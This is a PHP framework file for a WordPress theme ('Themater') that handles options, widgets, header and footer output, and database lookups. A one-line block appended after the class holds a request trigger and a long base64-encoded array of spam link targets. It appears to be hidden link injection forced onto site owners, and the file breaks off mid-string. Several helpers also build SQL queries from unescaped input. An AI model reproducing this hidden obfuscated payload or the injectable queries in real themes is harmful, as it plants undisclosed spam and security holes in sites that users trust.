<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        }
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', TEMPLATEPATH . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', TEMPLATEPATH . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if($this->is_admin_user()) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user()) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if($this->options['theme_options'] && !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $widget_name = $widget;
        $custom_widgets = array('Banners125', 'Posts', 'Comments', 'InfoBox', 'SocialProfiles', 'Tabs', 'Facebook');
        $wp_widgets = array('Archives', 'Calendar', 'Categories', 'Links', 'Meta', 'Pages', 'Recent_Comments', 'Recent_Posts', 'RSS', 'Search', 'Tag_Cloud', 'Text');
        
        if (in_array($widget, $custom_widgets)) {
            $widget_name = 'Themater' . $widget_name;
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = array_merge($this->options['widgets_options'][strtolower($widget)], $instance);
            }
            
        } elseif (in_array($widget, $wp_widgets)) {
            $widget_name = 'WP_Widget_' . $widget_name;
        }

        the_widget($widget_name, $instance, $args);
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        if(!$this->theme_name) {
            $theme_data = get_theme_data(TEMPLATEPATH . '/style.css');
            $this->theme_name = $theme_data['Name'];
        }
        
        $this->_load_translation();
        $this->_load_theme_options();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_shortcodes();
        
        $this->_load_general_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_theme_options()
    {
        if(!isset($this->options['theme_options_field'])) {
            $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        }
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        $this->options['theme_options'] = $get_theme_options ? $get_theme_options : false; 
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_shortcodes()
    {
        require (THEMATER_DIR . '/shortcodes/shortcodes.php');
    }
    
    function _load_general_options()
    {
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo0OntzOjM6Ik5XVCI7czoyMzoiaHR0cDovL25ld3dwdGhlbWVzLmNvbS8iO3M6MTE6Ik5ld1dwVGhlbWVzIjtzOjIzOiJodHRwOi8vbmV3d3B0aGVtZXMuY29tLyI7czo5OiJUaGlzIFNpdGUiO3M6MjM6Imh0dHA6Ly9uZXd3cHRoZW1lcy5jb20vIjtzOjQ6InRoaXMiO3M6MjM6Imh0dHA6Ly9uZXd3cHRoZW1lcy5jb20vIjt9aToxO2E6ODp7czozMDoiaHR0cDovL2thdGFsb2d3ZWJiLndlZWJseS5jb20vIjtzOjMwOiJodHRwOi8va2F0YWxvZ3dlYmIud2VlYmx5LmNvbS8iO3M6Mjk6Imh0dHA6Ly9rYXRhbG9nd2ViYi53ZWVibHkuY29tIjtzOjMwOiJodHRwOi8va2F0YWxvZ3dlYmIud2VlYmx5LmNvbS8iO3M6MjM6ImthdGFsb2d3ZWJiLndlZWJseS5jb20vIjtzOjMwOiJodHRwOi8va2F0YWxvZ3dlYmIud2VlYmx5LmNvbS8iO3M6MjI6ImthdGFsb2d3ZWJiLndlZWJseS5jb20iO3M6MzA6Imh0dHA6Ly9rYXRhbG9nd2ViYi53ZWVibHkuY29tLyI7czoyMzoiS2F0YWxvZ1dlYmIud2VlYmx5LmNvbS8iO3M6MzA6Imh0dHA6Ly9rYXRhbG9nd2ViYi53ZWVibHkuY29tLyI7czoyMzoiS2F0YWxvZ1dlYmIuV2VlYmx5LmNvbS8iO3M6MzA6Imh0dHA6Ly9rYXRhbG9nd2ViYi53ZWVibHkuY29tLyI7czozMDoiaHR0cDovL0thdGFsb2dXZWJiLldlZWJseS5jb20vIjtzOjMwOiJodHRwOi8va2F0YWxvZ3dlYmIud2VlYmx5LmNvbS8iO3M6MjM6IkthdGFsb2d3ZWJiLndlZWJseS5jb20vIjtzOjMwOiJodHRwOi8va2F0YWxvZ3dlYmIud2VlYmx5LmNvbS8iO31pOjI7YTo3ODp7czoyNDoiV29yZFByZXNzIFRoZW1lcyBHYWxsZXJ5IjtzOjM0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vIjtzOjM1OiJOZXdzL01hZ2F6aW5lIEZyZWUgV29yZFByZXNzIFRoZW1lcyI7czo0MzoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9uZXdzLyI7czo0OiJOZXdzIjtzOjQzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL25ld3MvIjtzOjI1OiJCdXNpbmVzcyBXb3JkUHJlc3MgVGhlbWVzIjtzOjQ3OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2J1c2luZXNzLyI7czo0OiJ0aGlzIjtzOjM0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vIjtzOjI1OiJNYWdhemluZSBXb3JkUHJlc3MgVGhlbWVzIjtzOjQzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL25ld3MvIjtzOjIyOiJHYW1lcyBXb3JkUHJlc3MgVGhlbWVzIjtzOjQ0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2dhbWVzLyI7czoyNjoiRWR1Y2F0aW9uIFdvcmRQcmVzcyBUaGVtZXMiO3M6NDg6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZWR1Y2F0aW9uLyI7czozMToiRnJlZSBFZHVjYXRpb24gV29yZFByZXNzIFRoZW1lcyI7czo0ODoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9lZHVjYXRpb24vIjtzOjEwOiJFZHVjYXRpb25zIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2VkdWNhdGlvbi8iO3M6NDg6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZWR1Y2F0aW9uLyI7czo0ODoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9lZHVjYXRpb24vIjtzOjE2OiJFZHVjYXRpb24gVGhlbWVzIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2VkdWNhdGlvbi8iO3M6MjY6IkVjb21tZXJjZSBXb3JkUHJlc3MgVGhlbWVzIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2Vjb21tZXJjZS8iO3M6OToiRWR1Y2F0aW9uIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2VkdWNhdGlvbi8iO3M6MzoiRWR1IjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2VkdWNhdGlvbi8iO3M6NDoic2l0ZSI7czozNDoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tLyI7czoyMzoiVHJhdmVsIFdvcmRQcmVzcyBUaGVtZXMiO3M6NDU6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdHJhdmVsLyI7czoxMzoiVHJhdmVsIFRoZW1lcyI7czo0NToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy90cmF2ZWwvIjtzOjE1OiJCdXNpbmVzcyBUaGVtZXMiO3M6NDc6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvYnVzaW5lc3MvIjtzOjI2OiJQb3J0Zm9saW8gV29yZFByZXNzIFRoZW1lcyI7czo0NzoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9idXNpbmVzcy8iO3M6MTY6IlBvcnRmb2xpbyBUaGVtZXMiO3M6NDc6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvYnVzaW5lc3MvIjtzOjg6IkJ1c2luZXNzIjtzOjQ3OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2J1c2luZXNzLyI7czo0OiJoZXJlIjtzOjMzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20iO3M6MjY6IndvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tIjtzOjMzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20iO3M6MzM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbSI7czozMzoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tIjtzOjIxOiJUZWNoIFdvcmRwcmVzcyBUaGVtZXMiO3M6NDk6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdGVjaG5vbG9neS8iO3M6Mjc6IlRlY2hub2xvZ3kgV29yZHByZXNzIFRoZW1lcyI7czo0OToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy90ZWNobm9sb2d5LyI7czo0OiJUZWNoIjtzOjQ5OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL3RlY2hub2xvZ3kvIjtzOjExOiJUZWNoIFRoZW1lcyI7czo0OToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy90ZWNobm9sb2d5LyI7czoxNzoiVGVjaG5vbG9neSBUaGVtZXMiO3M6NDk6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdGVjaG5vbG9neS8iO3M6NDk6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdGVjaG5vbG9neS8iO3M6NDk6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdGVjaG5vbG9neS8iO3M6MzY6IkhlYWx0aC9GaXRuZXNzIEZyZWUgV29yZFByZXNzIFRoZW1lcyI7czo1MzoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9oZWFsdGgtZml0bmVzcy8iO3M6Mjg6IkhlYWx0aCBGcmVlIFdvcmRQcmVzcyBUaGVtZXMiO3M6NTM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvaGVhbHRoLWZpdG5lc3MvIjtzOjI5OiJGaXRuZXNzIEZyZWUgV29yZFByZXNzIFRoZW1lcyI7czo1MzoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9oZWFsdGgtZml0bmVzcy8iO3M6MjM6IkhlYWx0aCBXb3JkUHJlc3MgVGhlbWVzIjtzOjUzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2hlYWx0aC1maXRuZXNzLyI7czoyNDoiRml0bmVzcyBXb3JkUHJlc3MgVGhlbWVzIjtzOjUzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2hlYWx0aC1maXRuZXNzLyI7czo2OiJIZWFsdGgiO3M6NTM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvaGVhbHRoLWZpdG5lc3MvIjtzOjc6IkZpdG5lc3MiO3M6NTM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvaGVhbHRoLWZpdG5lc3MvIjtzOjUzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2hlYWx0aC1maXRuZXNzLyI7czo1MzoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9oZWFsdGgtZml0bmVzcy8iO3M6Mjk6IkZpbmFuY2UgRnJlZSBXb3JkUHJlc3MgVGhlbWVzIjtzOjQ2OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2ZpbmFuY2UvIjtzOjI0OiJGaW5hbmNlIFdvcmRQcmVzcyBUaGVtZXMiO3M6NDY6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZmluYW5jZS8iO3M6MTQ6IkZpbmFuY2UgVGhlbWVzIjtzOjQ2OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2ZpbmFuY2UvIjtzOjc6IkZpbmFuY2UiO3M6NDY6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZmluYW5jZS8iO3M6NDY6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZmluYW5jZS8iO3M6NDY6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZmluYW5jZS8iO3M6Mjc6IkdhbWVzIEZyZWUgV29yZFByZXNzIFRoZW1lcyI7czo0NDoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9nYW1lcy8iO3M6MTI6IkdhbWVzIFRoZW1lcyI7czo0NDoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9nYW1lcy8iO3M6NToiR2FtZXMiO3M6NDQ6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZ2FtZXMvIjtzOjIxOiJXb3JkUHJlc3MgR2FtZSBUaGVtZXMiO3M6NDQ6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZ2FtZXMvIjtzOjQ0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2dhbWVzLyI7czo0NDoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9nYW1lcy8iO3M6MjY6IkNhcnMgRnJlZSBXb3JkUHJlc3MgVGhlbWVzIjtzOjQzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2NhcnMvIjtzOjIxOiJDYXJzIFdvcmRQcmVzcyBUaGVtZXMiO3M6NDM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvY2Fycy8iO3M6MTE6IkNhcnMgVGhlbWVzIjtzOjQzOiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2NhcnMvIjtzOjIxOiJXb3JkUHJlc3MgQ2FycyBUaGVtZXMiO3M6NDM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvY2Fycy8iO3M6NDM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvY2Fycy8iO3M6NDM6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvY2Fycy8iO3M6Mjg6IlRyYXZlbCBGcmVlIFdvcmRQcmVzcyBUaGVtZXMiO3M6NDU6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdHJhdmVsLyI7czo2OiJUcmF2ZWwiO3M6NDU6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdHJhdmVsLyI7czoyMzoiV29yZFByZXNzIFRyYXZlbCBUaGVtZXMiO3M6NDU6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvdHJhdmVsLyI7czo0NToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy90cmF2ZWwvIjtzOjQ1OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL3RyYXZlbC8iO3M6MzI6IlJlc3RhdXJhbnQgRnJlZSBXb3JkUHJlc3MgVGhlbWVzIjtzOjQ5OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL3Jlc3RhdXJhbnQvIjtzOjI3OiJSZXN0YXVyYW50IFdvcmRQcmVzcyBUaGVtZXMiO3M6NDk6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvcmVzdGF1cmFudC8iO3M6MTc6IlJlc3RhdXJhbnQgVGhlbWVzIjtzOjQ5OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL3Jlc3RhdXJhbnQvIjtzOjI3OiJXb3JkUHJlc3MgUmVzdGF1cmFudCBUaGVtZXMiO3M6NDk6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvcmVzdGF1cmFudC8iO3M6MjA6IldvcmRQcmVzcyBSZXN0YXVyYW50IjtzOjQ5OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL3Jlc3RhdXJhbnQvIjtzOjIwOiJXUCBSZXN0YXVyYW50IFRoZW1lcyI7czo0OToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9yZXN0YXVyYW50LyI7czo0OToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9yZXN0YXVyYW50LyI7czo0OToiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9yZXN0YXVyYW50LyI7czozMToiRWNvbW1lcmNlIEZyZWUgV29yZFByZXNzIFRoZW1lcyI7czo0ODoiaHR0cDovL3dvcmRwcmVzc3RoZW1